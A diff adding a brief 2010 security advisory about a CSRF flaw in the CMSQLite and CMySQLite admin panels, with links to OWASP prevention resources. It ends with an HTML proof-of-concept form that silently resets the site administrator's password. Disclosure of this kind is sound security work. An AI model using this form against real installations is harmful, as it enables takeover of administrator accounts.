@@ -1,0 +1,31 @@
+# Title: CMSQlite & CMySQLite CSRF Vulnerability
+# Author: ADEO Security
+# Published: 28/06/2010
+# Version: v1.3 >=
+# Vendor: http://www.cmsqlite.net
+
+# Description: "CMSQLite is a small, fast, flexible and complete Content-Management-System (CMS). 
+# It's perfect for freelancers, self-employeds, clubs and associations and small companies. 
+# CMSQLite is a CMS, basing on PHP and SQLite. That has many advantages!"
+
+# Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs (security@adeo.com.tr)
+
+# Vulnerability: CMSQlite and CMySQLite have CSRF vulnerabilites in the admin panel.
+# Attacker can change the password of the admin. For secure your web applications against 
+# CSRF vulnerabilities, look at this resources:
+* OWASP-TR/WGT anticsurf Project - http://code.google.com/p/anticsurf/
+* CSRF Prevention CS -
+http://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet
+
+# PoC:
+<html>
+<body>
+<form action="http://server/admin/helper/updateUser.php\" method="POST">
+<input type="hidden" name="userId" value="1">
+<input type="hidden" name="userUsername" value="admin">
+<input type="hidden" name="password1" value="csrfhits">
+<input type="hidden" name="password2" value="csrfhits">
+</form>
+
+</body>
+</html>
